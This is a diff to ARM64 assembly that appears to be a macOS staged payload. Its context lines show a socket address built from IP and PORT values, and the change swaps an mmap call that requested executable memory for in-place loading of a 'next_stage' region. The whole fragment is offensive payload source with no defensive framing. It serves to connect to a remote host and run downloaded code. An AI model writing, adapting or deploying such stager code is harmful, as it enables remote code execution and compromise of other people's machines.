@@ -48,16 +48,16 @@ start:
     lsl    x2, x2, #12
 
     /* mmap(addr=0, length='x2', prot=7, flags=0x1802 (MAP_ANON|MAP_PRIVATE|MAP_JIT), fd=0, offset=0) */
-    mov    x0, xzr
-    mov    x1, x2
-    mov    x2, #7
-    mov    x3, #6146
-    mov    x4, xzr
-    mov    x5, xzr
-    mov    x16, SYS_MMAP
-    svc    0
-    cmn    x0, #0x1
-    beq    failed
+    adr    x0, next_stage
+    lsr    x0, x0, #12
+    add    x0, x0, #1
+    lsl    x0, x0, #12
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
 
     /* Grab the saved size, save the address */
     ldr    w4, [sp]
@@ -95,4 +95,6 @@ sockaddr:
 .short AF_INET
 .short PORT
 .word  IP
+
+next_stage:
 
